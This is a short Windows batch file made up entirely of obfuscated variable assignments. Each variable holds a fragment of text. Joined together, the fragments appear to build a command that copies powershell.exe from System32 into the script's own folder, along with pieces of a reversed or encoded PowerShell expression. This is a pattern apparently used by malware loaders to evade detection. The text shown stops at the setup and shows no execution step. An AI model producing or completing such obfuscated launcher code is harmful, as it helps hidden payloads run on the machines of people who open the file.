@echo off
set "DFdGtHVcuL=s\"
set "nrwKPAZzVS=st"
set "FvuTkHGAgi=xe"
set "uFTiGvlalc=co"
set "WMidJXJaMU=rS"
set "JcpBXrNxAs=py"
set "kLMgPGxpmH=ws"
set "LVRGfEiaxF=po"
set "dDtnDlitRT=\W"
set "xSbazbqoMO=32"
set "uGakWxTgzD=he"
set "OsceKkJRIH=\v"
set "sLNFhqTrja=1."
set "ezeUfQqKMO=.e"
set "sUEhUqYMGD=rs"
set "ldhHTagXBx=Sy"
set "CbLxwWqNeE= C"
set "PtLoZupvkN=do"
set "iSUDMEMrJz=ll"
set "EGcgyUCfef=y "
set "lyupyhQcQx=0\"
set "eyWGOjAUKQ=ow"
set "fVRuNzZavp= /"
set "IwgCBuArON=in"
set "WkfhPXytKY=he"
set "XRVrEbLzze=Po"
set "BYzYYJReni=we"
set "ozCvQhOiuT=:\"
set "LotFUtUwLK=nd"
set "JPWfmllNif=ll"
set "YVfJcKLnGw=Wi"
set "kQCPTgkMlm=em"
set "oGLcFYcqYV=we"
set "PkAxGCnhER=cd"
set "HYgSERCfdm= %~dp0"
set "yEhRYPzNXx=6] -"
set "wLtjDYQKER=$Wfr"
set "iCGZZhQJaX=Fina"
set "yzhRvUJFMm=tS46"
set "wbFifGZiNR=-1.."
set "HoHxldMhHA=;$Wf"
set "ofPPenTlfX=gsYZ"
set "VyIKjCYMno=ode]"
set "GnlwIcVmDR=Disp"
set "MwcMwJWWxz=s75K"
set "jIatUYHdtq=morF"
set "VUvAoNfKoB='[-1"
set "RiByMJddkC=-4] "
